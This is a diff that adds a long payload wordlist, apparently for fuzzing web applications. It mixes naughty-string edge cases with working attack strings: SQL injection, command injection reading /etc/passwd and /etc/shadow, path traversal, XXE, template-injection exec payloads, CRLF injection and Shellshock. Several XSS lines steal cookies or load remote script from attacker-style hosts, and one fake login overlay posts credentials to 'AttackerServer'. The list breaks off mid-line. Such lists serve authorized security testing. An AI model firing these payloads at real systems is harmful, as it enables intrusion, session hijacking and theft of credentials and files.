@@ -1,0 +1,1094 @@
+                  ​    　
+ or '1'='1'--
+ or 'unusual' = 'unusual'
+ or 0=0 #"
+ or 1/*
+ or 1=1
+ or 2 > 1
+ or 3=3
+ or pg_sleep(__TIME__)--"
+ UNION ALL SELECT
+ union select * from users where login = char ...
+!
+!'
+!@#$%%^#$%#$@#$%$$@#$%^^**(()
+!@#$%^&*()`~
+!@#0%^#0##018387@#0^^**(()
+"
+" & whoami
+" && whoami
+" onclick=alert(1)//">click
+" or "a"="a
+" or "x"="x
+" or 0=0 #
+" or 0=0 --
+" or 1=1
+" or 1=1 or ""="
+" or 1=1#
+" or 1=1--
+" or 1=1/*
+" or benchmark(10000000,MD5(1))#
+" whoami
+" | whoami
+" || whoami
+""});});});alert(1);$('a').each(function(i){$(this).click(function(event){x({y
+"'
+"' or 1 --'"
+") or ("a"="a
+") or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+"));waitfor delay '0:0:__TIME__'--
+"; whoami
+"; ||confirm('XSS') || "
+"><a/\test="%26quot;x%26quot;"href='%01javascript:/*%b1*/;location.assign("//hackerone.com/stealthy?x="+location)'>Click
+"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;scumdestroy.xss.ht&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vc2N1bWRlc3Ryb3kueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
+"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vc2N1bWRlc3Ryb3kueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; autofocus>
+"><script src=https://scumdestroy.xss.ht></script>
+"><Script> var b = document.createElement("html"); b.innerHTML = Array(40370176).toString(); b.innerHTML = "";</script>
+"><script>"
+"><ScRIpt>confirm.call(null,1)
+"><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'+document.cookie</script>
+"><scRIpt>prompt.call(null,1)
+"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vc2N1bWRlc3Ryb3kueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>
+">Promise.all([1]).then(alert)
+">xxx<P>yyy
+">{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:'',message:'alert\x2823\x29'}
+"\t"
+"])},alert(1));(function xss() {//
+"}]}';alert(1);{{'
+#
+#&apos;
+#'
+#<img src=x onerror=alert(23)>
+#document.location='javascript:alert%2823%29'
+#xA
+#xA#xD
+#xD
+#xD#xA
+#{ 3 * 3 }
+#{3*3}
+$
+$(`whoami`)
+$(touch /tmp/blns.fail)
+$1.00
+$;/usr/bin/id
+$ENV{'HOME'}
+$HOME
+$NULL
+$null
+$USER
+${"freemarker.template.utility.Execute"?new()("id")}
+${6*6}
+${alert(1)}
+${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
+${T(java.lang.System).getenv()}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+${{3*3}}
+%
+%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%
+%% * 55
+%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%
+%%20d
+%*.*s
+%.2049d
+%00
+%00../../../../../../etc/passwd
+%00../../../../../../etc/shadow
+%00/
+%00/etc/passwd%00
+%00/etc/shadow%00
+%01%02%03%04%0a%0d%0aADSF
+%08x
+%0a
+%0a id %0a
+%0a ping -i 30 127.0.0.1 %0a
+%0a%0d
+%0a/bin/cat%20/etc/passwd
+%0a/bin/cat%20/etc/shadow
+%0A/usr/bin/id
+%0A/usr/bin/id%0A
+%0Acat%20/etc/passwd
+%0Aid
+%0Aid%0A
+%0d%0aX-Injection-Header:%20AttackValue
+%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
+%20
+%20$(sleep%2050)
+%20'sleep%2050'
+%20{${phpinfo()}}
+%20{${sleep(20)}}
+%20{${sleep(3)}}
+%20|
+%21
+%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%       25%5c..%25%5c..%255cboot.ini
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%   25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+%2500
+%250a
+%252e%252e%252f
+%26
+%27%20or%201=1
+%28
+%29
+%2A
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%7C
+%2C
+%2e%2e%2f
+%3A
+%3C
+%3C%3F
+%3cscript%3ealert("XSS");%3c/script%3e
+%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
+%3cscript%3ealert(document.cookie);%3c%2fscript%3e
+%5C
+%5C/
+%60
+%7C
+%99999999999s
+%@
+%d
+%d * 55
+%d%d%d%d
+%d%d%d%d%d%d%d%d%d%d
+%foo;
+%n
+%n * 55
+%n%n%n%n
+%n%n%n%n%n%n%n%n%n%n
+%p * 55
+%p%p%p%p
+%p%p%p%p%p%p%p%p%p%p
+%s * 55
+%s%p%x%d
+%s%p%x%d%s%p%x%d%s%p%x%d
+%s%s%s%s
+%s%s%s%s%s
+%s%s%s%s%s%s%s%s%s%s
+%u * 55
+%u%u%u%u
+%u%u%u%u%u%u%u%u%u%u
+%x * 55
+%x%x%x%x
+%x%x%x%x%x%x%x%x%x%x
+%x('ls -al /')
+&
+& 
+& id
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+& whoami
+&#0000060
+&#0000060;
+&#000060
+&#000060;
+&#00060
+&#00060;
+&#0060
+&#0060;
+&#060
+&#060;
+&#10;
+&#10;&#13;
+&#13;
+&#13;&#10;
+&#60
+&#60;
+&#x000003c
+&#X000003c
+&#x000003C
+&#X000003C
+&#x000003c;
+&#X000003c;
+&#x000003C;
+&#X000003C;
+&#x00003c
+&#X00003c
+&#x00003C
+&#X00003C
+&#x00003c;
+&#X00003c;
+&#x00003C;
+&#X00003C;
+&#x0003c
+&#X0003c
+&#x0003C
+&#X0003C
+&#x0003c;
+&#X0003c;
+&#x0003C;
+&#X0003C;
+&#x003c
+&#X003c
+&#x003C
+&#X003C
+&#x003c;
+&#X003c;
+&#x003C;
+&#X003C;
+&#x03c
+&#X03c
+&#x03C
+&#X03C
+&#x03c;
+&#X03c;
+&#x03C;
+&#X03C;
+&#x3c
+&#X3c
+&#x3C
+&#X3C
+&#x3c;
+&#X3c;
+&#x3C;
+&#X3C;
+&& 
+&& whoami
+&apos;
+&apos;%20OR
+&apos;-alert(document.domain)-&apos;
+&foo;
+&lt
+&LT
+&lt;
+&LT;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+&lt;&gt;&quot;'%;)(&amp;+
+&ltscript&gtalert(document.cookie);&ltscript&gtalert
+&ltscript&gtalert(document.cookie);</script>
+&quot;;id&quot;
+'
+' & whoami
+' && whoami
+' (select top 1
+' --
+' ;
+' or ''='
+' OR '1'='1
+' or '1'='1'--
+' or 'x'='x
+' or (EXISTS)
+' or 0=0 #
+' or 0=0 --
+' or 1=1
+' OR 1=1 -- 1
+' or 1=1 or ''='
+' or 1=1#
+' or 1=1--
+' or 1=1/*
+' or a=a--
+' or benchmark(10000000,MD5(1))#
+' or uid like '%
+' or uname like '%
+' or user like '%
+' or userid like '%
+' or username like '%
+' UNION ALL SELECT
+' UNION SELECT
+' whoami
+' || whoami
+'"
+'%20or%20''='
+'%20or%20'x'='x
+'%20or%201=1
+'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
+'';!--"<XSS>=&{()}
+') or ('a'='a
+') or ('x'='x
+') or benchmark(10000000,MD5(1))#
+')%20or%20('x'='x
+')) or benchmark(10000000,MD5(1))#
+'*prompt(1)*'
+'; exec master..xp_cmdshell
+'; exec xp_regread
+'; whoami
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
+'><script>alert(document.cookie);</script>
+'><script>alert(document.cookie)</script>
+'?prompt`1`?'
+'hi' or 'x'='x';
+'or select *
+'sqlattempt1
+'|alert(1)|'
+'||UTL_HTTP.REQUEST
+(
+(')
+() { 0; }; touch /tmp/blns.shellshock1.fail;
+() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }
+(null)
+(sqlattempt2)
+)
+) or sleep(__TIME__)='
+)) or benchmark(10000000,MD5(1))#
+)) or pg_sleep(__TIME__)--"
+));waitfor delay '0:0:__TIME__'--
+*
+*&apos;
+*'
+*(|(mail=*))
+*(|(objectclass=*))
+*/*
+*|
++
++%00
++++ATH0
++0
++0.0
+,
+,./;'[]\-=
+,@variable
+-
+-$1.00
+-,
+--
+--';
+--1
+--help
+--sp_password
+--version
+-.
+-0
+-0.0
+-1
+-1#IND
+-1.0
+-1.00
+-1.97684995314e+16
+-1/2
+-128
+-129
+-139333426276771806651771
+-1E+02
+-1E02
+-1E2
+-2
+-20
+-2147483648
+-2147483648/-1
+-2147483649
+-268435455
+-32768
+-32769
+-9223372036854775808
+-9223372036854775808/-1
+-9223372036854775809
+-Infinity
+.
+.. / .. / .. / .. / .. / .. / etc / passwd
+..%%35%63
+..%%35c
+..%25%35%63
+..%255c
+..%5c
+..%bg%qf
+..%c0%af
+..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini
+..%u2215
+..%u2216
+....//....//etc/passwd
+../
+../../../../../../../../../../../../boot.ini
+../../../../../../../../../../../../boot.ini%00
+../../../../../../../../../../../../etc/hosts
+../../../../../../../../../../../../etc/hosts%00
+../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../etc/shadow
+../../../../../../../../../../../../etc/shadow%00
+../../../../../../../../../../../../localstart.asp
+../../../../../../../../../../../../localstart.asp%00
+../../../../../../../../conf/server.xml
+../../boot.ini
+../../etc/passwd
+..\
+..\..\..\..\..\..\..\..\..\..\boot.ini
+..\..\..\..\..\..\..\..\..\..\boot.ini%00
+..\..\..\..\..\..\..\..\..\..\etc\passwd
+..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+..\..\..\..\..\..\..\..\..\..\etc\shadow
+..\..\..\..\..\..\..\..\..\..\etc\shadow%00
+.1024d
+.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd
+.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow
+/
+/%%0a0aSet-Cookie:crlf=injection
+/%00/
+/%0aSet-Cookie:crlf=injection
+/%0d%0aSet-Cookie:crlf=injection
+/%0dSet-Cookie:crlf=injection
+/%23%0aSet-Cookie:crlf=injection
+/%23%0d%0aSet-Cookie:crlf=injection
+/%23%0dSet-Cookie:crlf=injection
+/%25%30%61Set-Cookie:crlf=injection
+/%25%30aSet-Cookie:crlf=injection
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini
+/%250aSet-Cookie:crlf=injection
+/%25250aSet-Cookie:crlf=injection
+/%2A
+/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
+/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection
+/%2F..%0d%0aSet-Cookie:crlf=injection
+/%3f%0d%0aSet-Cookie:crlf=injection
+/%3f%0dSet-Cookie:crlf=injection
+/%u000aSet-Cookie:crlf=injection
+/&apos;
+/'
+/,%ENV,/
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow
+/.../.../.../.../.../
+/../../../../../../../../%2A
+/../../../../../../../../../../../boot.ini
+/../../../../../../../../../../../boot.ini%00
+/../../../../../../../../../../../boot.ini%00.html
+/../../../../../../../../../../../boot.ini%00.jpg
+/../../../../../../../../../../../etc/passwd%00.html
+/../../../../../../../../../../../etc/passwd%00.jpg
+/../../../../../../../../../../etc/passwd
+/../../../../../../../../../../etc/passwd^^
+/../../../../../../../../../../etc/shadow
+/../../../../../../../../../../etc/shadow^^
+/../../../../../../../../bin/id|
+/..\../..\../..\../..\../..\../..\../boot.ini
+/..\../..\../..\../..\../..\../..\../etc/passwd
+/..\../..\../..\../..\../..\../..\../etc/shadow
+/./././././././././././boot.ini
+/./././././././././././etc/passwd
+/./././././././././././etc/shadow
+/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini
+//
+//*
+/boot.ini
+/dev/null; touch /tmp/blns.fail ; echo
+/etc/passwd
+/etc/shadow
+/index.html|id|
+0
+0 or 1=1
+0,,0
+0,0,0
+0,0/0,0
+0,00
+0..0
+0.0.0
+0.0/0
+0.0/0.0
+0.00
+0/0
+00
+01000
+08
+09
+0x0
+0x481b49d0f8d5a3e7f821066157c37c
+0xabad1dea
+0xfffffff
+0xffffffff
+0xffffffffffffffff
+0️⃣ 1️⃣ 2️⃣ 3️⃣ 4️⃣ 5️⃣ 6️⃣ 7️⃣ 8️⃣ 9️⃣ 🔟
+1
+1 000 000,00
+1 000 000.00
+1 000,00
+1 000.00
+1 or benchmark(10000000,MD5(1))#
+1#IND
+1#INF
+1#QNAN
+1#SNAN
+1'000'000,00
+1'000'000.00
+1'000,00
+1'000.00
+1'; DROP TABLE users-- 1
+1) or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+1,0/0,0
+1,000,000.00
+1,000.00
+1.0
+1.0/0.0
+1.00
+1.000,00
+1.000.000,00
+1.79769313486e+308
+1/0
+1/2
+11111';\u006F\u006E\u0065rror=\u0063onfirm; throw'1
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+1234 " AND 1=0 UNION ALL SELECT "root", "81dc9bdb52d04dc20036dbd8313ed055
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+1234 ' AND 1=0 UNION ALL SELECT 'root', '81dc9bdb52d04dc20036dbd8313ed055
+123456789012345678901234567890123456789
+127
+128
+16649142472222295162770764775
+18446744073709551615
+18446744073709551616
+1;(load_file(char(47,101,116,99,47,112,97,115, ...
+1;DROP TABLE users
+1;SELECT%20*
+1E+02
+1E02
+1E2
+2
+2.07564741538e+16
+2.2250738585072011e-308
+2.22507385851e-308
+21%
+2139095040
+2147483647
+2147483648
+255
+256
+268435455
+28%
+3.38800266804e+16
+32767
+32768
+4294967295
+4294967296
+65535
+65536
+79228162514264337593543950336B
+79228162514264337593543950336L
+79228162514264337593543950336l
+9223372036854775807
+9223372036854775808
+999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
+:
+;
+; 
+; id
+; whoami
+;/usr/bin/id\n
+;dir
+;id
+;id;
+;id\n
+;id|
+;ls -la
+;netstat -a;
+;read;
+;system('/usr/bin/id')
+;system('cat%20/etc/passwd')
+;system('id')
+;|/usr/bin/id|
+<
+<  script > < / script>
+<!--><svg onload='top[/al/.source+/ert/.source](document.cookie)'>
+<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<![CDATA[<test></test>]]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com/text.txt" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]>
+<!DOCTYPE thust [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
+<!DOCTYPE xxe [ <!ENTITY % file SYSTEM "file:///c:/boot.ini"><!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">%dtd;%trick;]>
+<!DOCTYPE xxe [ <!ENTITY % file SYSTEM "file:///etc/issue"><!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">%dtd;%trick;]>
+<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>
+<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://127.0.0.1:80/?%file;'>  "> %int;
+<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://127.0.0.1:21/%data3;'>">
+<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+<%= 3 * 3 %>
+<%= File.open('/etc/passwd').read %>
+</script><img src=1 onerror=alert(document.domain)>
+<<
+<<<
+<<< %s(un='%s') = %u
+<<script>alert("XSS");//<</script>
+<>"'%;)(&+
+<><img src=1 onerror=alert(1)>
+<>?:"{}|_+
+<?
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/issue" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/issue" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com:80" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example:443" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><test></test>
+<a id="x" data-toggle="collapse" href="#x" data-parent="<img src=x onerror=alert(1) />">XSS</a>
+<div onpointerdown="alert(45)">hahwul(45)</div>
+<div onpointerenter="alert(45)">hahwul(45)</div>
+<div onpointerleave="alert(45)">hahwul(45)</div>
+<div onpointermove="alert(45)">hahwul(45)</div>
+<div onpointerout="alert(45)">hahwul(45)</div>
+<div onpointerover="alert(45)">hahwul(45)</div>
+<div onpointerup="alert(45)">hahwul(45)</div>
+<div style="position: fixed;z-index: 9998; width: 100%;height: 100%;top:0; left: 0;background: #000000; opacity: 0.6"></div> <form action="http:AttackerServer" method="POST" style="text-align:center;background-color: #00adef;z-index: 9999;position: fixed;top: 200px;left: 25%;width: 800px;height: auto;padding: 10px;"> <h2>You Have To Sign To See This Page</h2> Email:<br> <input type="email" name="email" placeholder="Enter Your Email" style="width: 90%;height: 40px;border: none;border-radius: 25px;text-align: center;margin: 10px 0; "><br> Password:<br> <input type="Password" name="pass" placeholder="Enter Your Password" style="width: 90%;height: 40px;border: none;border-radius: 25px;text-align: center;margin: 10px 0;"><br> <input type="submit" value="Submit" style="background-color: #ffffff;color: #8e99a3;border: none;border-radius: 20px;"> </form>
+<foo><![CDATA[' or 1=1 or ''=']]></foo>
+<foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">
+<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"> 
+<image href='1' onerror='alert(1)' /></svg>#x" />
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG DYNSRC="javascript:alert('XSS')">
+<IMG LOWSRC="javascript:alert('XSS')">
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<IMG SRC="jav   ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC="javascript:alert('XSS')"
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<img src='zzz.jpg' onerror= alert('xss') ></img>
+<IMG SRC=`javascript:alert("'XSS'")`>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<img src=x onerror=location=atob`AcLSFNivGXo5DnoPqAdVxHB7qQrUvxjgXxmrGhEFH6v4`> 
+<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>
+<IMG%20SRC='javasc  ript:alert(document.cookie)'>
+<IMG%20SRC='javascript:alert(document.cookie)'>
+<img/src=x onError="`${x}`;alert(`Ex.Mi`);">
+<input id='a'value='global'><input id='b'value='E'><input 'id='c'value='val'><input id='d'value='aler'><input id='e'value='t(documen'><input id='f'value='t.domain)'><svg+onload[\r\n]=$[a.value+b.value+c.value](d.value+e.value+f.value)
+<input ng-cut=$event.path|orderBy:'(y=alert)(1)'>
+<input onbeforeinput=alert(1)>
+<name>','')); phpinfo(); exit;/*</name>
+<p slot-scope="){}}])+this.constructor.constructor('alert(1)')()})};//">
+<sc<script>ript> alert('xss') </scri</script>pt>
+<script/id=Uncaught>throw[onerror=eval][e=[x='+alert\x2823\x29']]=0[e.lineNumber=e.columnNumber=e.fileName=e.message=x]=e</sCript>
+<script>$.getScript("//scumdestroy.xss.ht")</script>
+<scRIpt>[onerror]=[alert];throw 1</scRIpt>
+<script>alert("XSS")</script>
+<script>alert(document.cookie)</script>
+<scRIpt>const{onerror}=alert;throw 1</scRIpt>
+<script>eval("ale" + "rt('xss')")</script>
+<script>f=document.createElement("iframe");f.id="pwn";f.src="/robots.txt";f.onload=()=>{x=document.createElement('script');x.src='//bo0om.ru/csp.js';pwn.contentWindow.document.body.appendChild(x)};document.body.appendChild(f);</script>
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//scumdestroy.xss.ht");a.send();</script>
+<scRIpt>onerror=eval,new'\u{22}-alert\u{28}1\u{29}//'</sCript>
+<scrpt>confrm()</scrpt>
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
+<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<style>:target {color:red;}</style>
+<sVg/onfake="x=y"oNload=;1^(co\u006efirm)``^1//
+<svg/onload='alert&#40 23 &#41'>
+<svg><animate xlink:href="#x" attributeName="href" values="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'>
